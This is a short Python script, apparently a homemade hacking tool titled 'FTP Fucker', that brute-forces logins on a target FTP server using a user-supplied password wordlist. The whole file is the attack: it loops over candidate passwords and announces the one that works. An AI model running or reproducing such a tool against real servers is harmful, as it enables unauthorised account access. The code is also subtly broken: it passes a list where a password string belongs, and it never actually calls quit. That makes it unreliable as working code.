#! /usr/bin/python3
print (".")
print (".")
print (".")
print (".")
print (".")
print ("FTP Fucker // Lunatix Psycho")
print ("/////////////////////////////")

import ftplib

server=input("Enter target FTP server IP :")
print(server)

username=input("Enter target username :")
print(username)

password=input("Enter password file or path :")
print(password)

try:

    with open(password, "r") as pw:
        for word in pw:
            word=word.split("\r")
            try:
                ftp=ftplib.FTP(server)
                ftp.login(username, word)
                print('Connected to the FTP server. The password is' + word)
                ftp.quit
            except:
                print("Still trying...")
except:
    print("wordlist error. retry!")
